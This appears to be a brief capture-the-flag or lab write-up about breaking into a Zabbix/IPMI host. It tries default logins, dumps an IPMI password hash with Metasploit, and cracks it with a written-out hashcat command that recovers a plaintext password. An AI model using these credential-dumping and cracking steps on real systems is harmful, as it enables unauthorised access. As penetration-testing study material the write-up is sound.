Let's look for some default logins;;

Default username/password is **Admin/zabbix**.
https://openbaton.github.io/documentation/zabbix-server-configuration-3.0/

Tried: Admin:zabbix

Incorrect user name or password or account is temporarily blocked.
Well since we know the username, we can try to bruteforce it with the rockyou.txt wordlist.

Didn't work, let's try msfconsole..
scanner/ipmi/ipmi_dumphashes

```[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:1d3826a7820100002df6b31cb4aea2d0c1e52de978f7504f6896b85c244aeca29553b6549b540daca123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:d78cae0b42be9a4838f6c45f59e5eb18f6d88315
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution complete
```

Hashcat:
```hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --potfile-disable -D 1 --force  

Output:
58b62d87820900003004dc4cdcf924239d2484c1b31761d19b411600d2c072035779904332733b96a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:0e0ed8c6ada46dde1df11f69cfc8adb971fbc7fa:ilovepumkinpie1
```
